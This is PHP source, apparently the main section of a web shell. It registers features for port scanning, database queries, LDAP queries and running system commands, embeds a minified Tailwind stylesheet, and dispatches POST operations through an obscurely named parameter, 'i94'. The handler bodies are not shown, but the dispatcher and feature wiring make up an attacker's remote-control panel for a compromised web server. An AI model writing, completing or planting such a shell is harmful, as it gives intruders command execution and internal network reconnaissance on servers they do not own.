add_named_hook("GET_page", $PORT_SCAN, "NmakePortScanPage");
add_named_hook("POST_operation", $PORT_SCAN, "NhandlePortScan");


add_hook("features", "NqueryDatabaseHooksFeatures");
add_named_hook("GET_page", $QUERY_DATABASES, "NmakeQueryDatabasePage");
add_named_hook("POST_operation", $QUERY_DATABASES, "NhandleQueryDatabase");


add_hook("features", "NqueryLdapHooksFeatures");
add_named_hook("GET_page", $QUERY_LDAP, "NmakeQueryLDAPPage");
add_named_hook("POST_operation", $QUERY_LDAP, "NhandleQueryLDAP");


add_hook("features", "NsystemCommandHooksFeatures");
add_named_hook("GET_page", $RUN_COMMAND, "NmakeSystemCommandPage");
add_named_hook("POST_operation", $RUN_COMMAND, "NhandleSystemCommand");


// section.main
date_default_timezone_set("UTC");
$css = '/*! tailwindcss v3.4.3 | MIT License | https://tailwindcss.com*/*,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb}:after,:before{--tw-content:""}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:initial}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:initial;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:initial}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0}fieldset,legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}[multiple],[type=date],[type=datetime-local],[type=email],[type=month],[type=number],[type=password],[type=search],[type=tel],[type=text],[type=time],[type=url],[type=week],input:where(:not([type])),select,textarea{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:#fff;border-color:#6b7280;border-width:1px;border-radius:0;padding:.5rem .75rem;font-size:1rem;line-height:1.5rem;--tw-shadow:0 0 #0000}[multiple]:focus,[type=date]:focus,[type=datetime-local]:focus,[type=email]:focus,[type=month]:focus,[type=number]:focus,[type=password]:focus,[type=search]:focus,[type=tel]:focus,[type=text]:focus,[type=time]:focus,[type=url]:focus,[type=week]:focus,input:where(:not([type])):focus,select:focus,textarea:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow);border-color:#2563eb}input::-moz-placeholder,textarea::-moz-placeholder{color:#6b7280;opacity:1}input::placeholder,textarea::placeholder{color:#6b7280;opacity:1}::-webkit-datetime-edit-fields-wrapper{padding:0}::-webkit-date-and-time-value{min-height:1.5em;text-align:inherit}::-webkit-datetime-edit{display:inline-flex}::-webkit-datetime-edit,::-webkit-datetime-edit-day-field,::-webkit-datetime-edit-hour-field,::-webkit-datetime-edit-meridiem-field,::-webkit-datetime-edit-millisecond-field,::-webkit-datetime-edit-minute-field,::-webkit-datetime-edit-month-field,::-webkit-datetime-edit-second-field,::-webkit-datetime-edit-year-field{padding-top:0;padding-bottom:0}select{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' fill=\'none\' viewBox=\'0 0 20 20\'%3E%3Cpath stroke=\'%236b7280\' stroke-linecap=\'round\' stroke-linejoin=\'round\' stroke-width=\'1.5\' d=\'m6 8 4 4 4-4\'/%3E%3C/svg%3E");background-position:right .5rem center;background-repeat:no-repeat;background-size:1.5em 1.5em;padding-right:2.5rem;-webkit-print-color-adjust:exact;print-color-adjust:exact}[multiple],[size]:where(select:not([size="1"])){background-image:none;background-position:0 0;background-repeat:unset;background-size:initial;padding-right:.75rem;-webkit-print-color-adjust:unset;print-color-adjust:unset}[type=checkbox],[type=radio]{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:0;-webkit-print-color-adjust:exact;print-color-adjust:exact;display:inline-block;vertical-align:middle;background-origin:border-box;-webkit-user-select:none;-moz-user-select:none;user-select:none;flex-shrink:0;height:1rem;width:1rem;color:#2563eb;background-color:#fff;border-color:#6b7280;border-width:1px;--tw-shadow:0 0 #0000}[type=checkbox]{border-radius:0}[type=radio]{border-radius:100%}[type=checkbox]:focus,[type=radio]:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:2px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow)}[type=checkbox]:checked,[type=radio]:checked{border-color:#0000;background-color:currentColor;background-size:100% 100%;background-position:50%;background-repeat:no-repeat}[type=checkbox]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' fill=\'%23fff\' viewBox=\'0 0 16 16\'%3E%3Cpath d=\'M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0z\'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=checkbox]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=radio]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' fill=\'%23fff\' viewBox=\'0 0 16 16\'%3E%3Ccircle cx=\'8\' cy=\'8\' r=\'3\'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=radio]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:checked:focus,[type=checkbox]:checked:hover,[type=checkbox]:indeterminate,[type=radio]:checked:focus,[type=radio]:checked:hover{border-color:#0000;background-color:currentColor}[type=checkbox]:indeterminate{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' fill=\'none\' viewBox=\'0 0 16 16\'%3E%3Cpath stroke=\'%23fff\' stroke-linecap=\'round\' stroke-linejoin=\'round\' stroke-width=\'2\' d=\'M4 8h8\'/%3E%3C/svg%3E");background-size:100% 100%;background-position:50%;background-repeat:no-repeat}@media (forced-colors:active) {[type=checkbox]:indeterminate{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:indeterminate:focus,[type=checkbox]:indeterminate:hover{border-color:#0000;background-color:currentColor}[type=file]{background:unset;border-color:inherit;border-width:0;border-radius:0;padding:0;font-size:unset;line-height:inherit}[type=file]:focus{outline:1px solid ButtonText;outline:1px auto -webkit-focus-ring-color}::-webkit-scrollbar{width:.5rem}::-webkit-scrollbar-track{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(228 228 231/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-track{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(161 161 170/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(113 113 122/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(82 82 91/var(--tw-bg-opacity))}}a{text-decoration:none!important}*,::backdrop,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#3b82f680;--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}@media (min-width:1536px){.container{max-width:1536px}}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border-width:0}.visible{visibility:visible}.fixed{position:fixed}.absolute{position:absolute}.relative{position:relative}.inset-y-0{top:0;bottom:0}.z-50{z-index:50}.-mx-2{margin-left:-.5rem;margin-right:-.5rem}.-mx-4{margin-left:-1rem;margin-right:-1rem}.-my-2{margin-top:-.5rem;margin-bottom:-.5rem}.mx-1{margin-left:.25rem;margin-right:.25rem}.mx-auto{margin-left:auto;margin-right:auto}.mb-0{margin-bottom:0}.mb-8{margin-bottom:2rem}.ml-3{margin-left:.75rem}.ml-72{margin-left:18rem}.ml-auto{margin-left:auto}.mr-1{margin-right:.25rem}.mr-1\.5{margin-right:.375rem}.mt-1{margin-top:.25rem}.mt-10{margin-top:2.5rem}.mt-2{margin-top:.5rem}.mt-4{margin-top:1rem}.mt-8{margin-top:2rem}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.table{display:table}.flow-root{display:flow-root}.grid{display:grid}.contents{display:contents}.hidden{display:none}.h-16{height:4rem}.h-4{height:1rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.h-8{height:2rem}.h-full{height:100%}.max-h-96{max-height:24rem}.min-h-full{min-height:100%}.w-1{width:.25rem}.w-1\/3{width:33.333333%}.w-4{width:1rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-72{width:18rem}.w-8{width:2rem}.w-full{width:100%}.min-w-0{min-width:0}.min-w-full{min-width:100%}.max-w-full{max-width:100%}.max-w-xl{max-width:36rem}.flex-1{flex:1 1 0%}.flex-shrink-0,.shrink-0{flex-shrink:0}.flex-grow{flex-grow:1}.flex-grow-0{flex-grow:0}.cursor-pointer{cursor:pointer}.select-none{-webkit-user-select:none;-moz-user-select:none;user-select:none}.select-all{-webkit-user-select:all;-moz-user-select:all;user-select:all}.resize{resize:both}.list-inside{list-style-position:inside}.list-disc{list-style-type:disc}.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-8{gap:2rem}.gap-x-3{-moz-column-gap:.75rem;column-gap:.75rem}.gap-x-4{-moz-column-gap:1rem;column-gap:1rem}.gap-y-2{row-gap:.5rem}.gap-y-5{row-gap:1.25rem}.gap-y-6{row-gap:1.5rem}.gap-y-7{row-gap:1.75rem}.space-y-6>:not([hidden])~:not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.5rem*(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.5rem*var(--tw-space-y-reverse))}.divide-y>:not([hidden])~:not([hidden]){--tw-divide-y-reverse:0;border-top-width:calc(1px*(1 - var(--tw-divide-y-reverse)));border-bottom-width:calc(1px*var(--tw-divide-y-reverse))}.divide-gray-200>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(229 231 235/var(--tw-divide-opacity))}.divide-gray-300>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(209 213 219/var(--tw-divide-opacity))}.overflow-auto{overflow:auto}.overflow-hidden{overflow:hidden}.overflow-x-auto{overflow-x:auto}.overflow-y-auto{overflow-y:auto}.overflow-y-scroll{overflow-y:scroll}.whitespace-nowrap{white-space:nowrap}.rounded{border-radius:.25rem}.rounded-lg{border-radius:.5rem}.rounded-md{border-radius:.375rem}.border-0{border-width:0}.border-b{border-bottom-width:1px}.border-l-4{border-left-width:4px}.border-yellow-500{--tw-border-opacity:1;border-color:rgb(234 179 8/var(--tw-border-opacity))}.border-zinc-300{--tw-border-opacity:1;border-color:rgb(212 212 216/var(--tw-border-opacity))}.border-zinc-700{--tw-border-opacity:1;border-color:rgb(63 63 70/var(--tw-border-opacity))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251/var(--tw-bg-opacity))}.bg-indigo-500{--tw-bg-opacity:1;background-color:rgb(99 102 241/var(--tw-bg-opacity))}.bg-indigo-600{--tw-bg-opacity:1;background-color:rgb(79 70 229/var(--tw-bg-opacity))}.bg-red-500{--tw-bg-opacity:1;background-color:rgb(239 68 68/var(--tw-bg-opacity))}.bg-red-700{--tw-bg-opacity:1;background-color:rgb(185 28 28/var(--tw-bg-opacity))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity))}.bg-white\/5{background-color:#ffffff0d}.bg-yellow-100{--tw-bg-opacity:1;background-color:rgb(254 249 195/var(--tw-bg-opacity))}.bg-zinc-100{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity))}.bg-zinc-800{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}.bg-zinc-900{--tw-bg-opacity:1;background-color:rgb(24 24 27/var(--tw-bg-opacity))}.p-2{padding:.5rem}.p-3{padding:.75rem}.p-4{padding:1rem}.px-16{padding-left:4rem;padding-right:4rem}.px-2{padding-left:.5rem;padding-right:.5rem}.px-3{padding-left:.75rem;padding-right:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.py-1{padding-top:.25rem;padding-bottom:.25rem}.py-1\.5{padding-top:.375rem;padding-bottom:.375rem}.py-10{padding-top:2.5rem;padding-bottom:2.5rem}.py-12{padding-top:3rem;padding-bottom:3rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.py-3\.5{padding-top:.875rem;padding-bottom:.875rem}.py-4{padding-top:1rem}.pb-4,.py-4{padding-bottom:1rem}.pl-3{padding-left:.75rem}.pr-10{padding-right:2.5rem}.pr-4{padding-right:1rem}.text-left{text-align:left}.text-center{text-align:center}.text-right{text-align:right}.align-middle{vertical-align:middle}.font-mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.text-2xl{font-size:1.5rem;line-height:2rem}.text-base{font-size:1rem;line-height:1.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:.875rem;line-height:1.25rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.leading-6{line-height:1.5rem}.leading-7{line-height:1.75rem}.leading-8{line-height:2rem}.leading-9{line-height:2.25rem}.tracking-tight{letter-spacing:-.025em}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128/var(--tw-text-opacity))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81/var(--tw-text-opacity))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39/var(--tw-text-opacity))}.text-indigo-600{--tw-text-opacity:1;color:rgb(79 70 229/var(--tw-text-opacity))}.text-red-500{--tw-text-opacity:1;color:rgb(239 68 68/var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.text-yellow-600{--tw-text-opacity:1;color:rgb(202 138 4/var(--tw-text-opacity))}.text-zinc-400{--tw-text-opacity:1;color:rgb(161 161 170/var(--tw-text-opacity))}.text-zinc-500{--tw-text-opacity:1;color:rgb(113 113 122/var(--tw-text-opacity))}.text-zinc-800{--tw-text-opacity:1;color:rgb(39 39 42/var(--tw-text-opacity))}.text-zinc-900{--tw-text-opacity:1;color:rgb(24 24 27/var(--tw-text-opacity))}.placeholder-zinc-400::-moz-placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.placeholder-zinc-400::placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.shadow{--tw-shadow:0 1px 3px 0 #0000001a,0 1px 2px -1px #0000001a;--tw-shadow-colored:0 1px 3px 0 var(--tw-shadow-color),0 1px 2px -1px var(--tw-shadow-color)}.shadow,.shadow-md{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px #0000001a,0 2px 4px -2px #0000001a;--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color),0 2px 4px -2px var(--tw-shadow-color)}.shadow-sm{--tw-shadow:0 1px 2px 0 #0000000d;--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.ring-1{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.ring-inset{--tw-ring-inset:inset}.ring-black{--tw-ring-opacity:1;--tw-ring-color:rgb(0 0 0/var(--tw-ring-opacity))}.ring-gray-300{--tw-ring-opacity:1;--tw-ring-color:rgb(209 213 219/var(--tw-ring-opacity))}.ring-white\/10{--tw-ring-color:#ffffff1a}.ring-zinc-300{--tw-ring-opacity:1;--tw-ring-color:rgb(212 212 216/var(--tw-ring-opacity))}.ring-opacity-5{--tw-ring-opacity:0.05}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.duration-300{transition-duration:.3s}.hover\:bg-indigo-400:hover{--tw-bg-opacity:1;background-color:rgb(129 140 248/var(--tw-bg-opacity))}.hover\:bg-zinc-700:hover{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}.hover\:text-zinc-700:hover{--tw-text-opacity:1;color:rgb(63 63 70/var(--tw-text-opacity))}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.focus\:ring-inset:focus{--tw-ring-inset:inset}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241/var(--tw-ring-opacity))}.focus\:ring-indigo-600:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(79 70 229/var(--tw-ring-opacity))}.focus-visible\:outline:focus-visible{outline-style:solid}.focus-visible\:outline-2:focus-visible{outline-width:2px}.focus-visible\:outline-offset-2:focus-visible{outline-offset:2px}.focus-visible\:outline-indigo-500:focus-visible{outline-color:#6366f1}@media (min-width:640px){.sm\:-mx-6{margin-left:-1.5rem;margin-right:-1.5rem}.sm\:mx-auto{margin-left:auto;margin-right:auto}.sm\:ml-16{margin-left:4rem}.sm\:mt-0{margin-top:0}.sm\:flex{display:flex}.sm\:w-full{width:100%}.sm\:max-w-sm{max-width:24rem}.sm\:flex-auto{flex:1 1 auto}.sm\:flex-none{flex:none}.sm\:flex-row{flex-direction:row}.sm\:flex-wrap{flex-wrap:wrap}.sm\:items-center{align-items:center}.sm\:space-x-6>:not([hidden])~:not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem*var(--tw-space-x-reverse));margin-left:calc(1.5rem*(1 - var(--tw-space-x-reverse)))}.sm\:truncate{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.sm\:rounded-lg{border-radius:.5rem}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:text-3xl{font-size:1.875rem;line-height:2.25rem}.sm\:text-sm{font-size:.875rem;line-height:1.25rem}.sm\:leading-6{line-height:1.5rem}.sm\:tracking-tight{letter-spacing:-.025em}}@media (min-width:1024px){.lg\:-mx-8{margin-left:-2rem;margin-right:-2rem}.lg\:flex{display:flex}.lg\:items-center{align-items:center}.lg\:justify-between{justify-content:space-between}.lg\:px-8{padding-left:2rem;padding-right:2rem}}';

// Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
// on the page except the operation result.
$ISOLATED_OPERATIONS = array();
// Load the isolated operations
$args = array(&$ISOLATED_OPERATIONS);
call_hook("isolated_ops", $args);

/**
 * Define the enabled features
 *
 * @var array{title: string, description: string, svg: string, hidden?: bool, op: string}[] $ENABLED_FEATURES
 */
$ENABLED_FEATURES = array();
// Load the enabled features
$args = array(&$ENABLED_FEATURES);
call_hook("features", $args);

// Check if the request is not POST and the operation is not in the isolated operations list, if that is the case,
// render the page
if (
    !NisPost() ||
    !NisIsolatedOperation($_POST["i94"], $ISOLATED_OPERATIONS)
) {
    // load the page or get the fallback page
    $page = NloadPageOrDefault($ENABLED_FEATURES);
    NrenderPage($ENABLED_FEATURES, $page);

    // Check if the request is POST and the operation is not in the isolated operations list,
    // if that is the case open the command output screen to display the command output
    if (
        NisPost() &&
        !NisIsolatedOperation($_POST["i94"], $ISOLATED_OPERATIONS)
    ) {
        NopenCommandOutputScreen();
    }
}

// ensure the operation is a POST request, if so, call the operation handler
if (NisPost()) {
    $operation = $_POST["i94"];
    $args      = array($operation, $ENABLED_FEATURES);
    call_named_hook("POST_operation", $operation, $args);
}

// If the request is not POST and the operation is not in the isolated operations list, close the command output screen
if (
    !NisPost() &&
    !NisIsolatedOperation($_POST["i94"], $ISOLATED_OPERATIONS)
) {
    NcloseCommandOutputScreen();
}

// section.main.end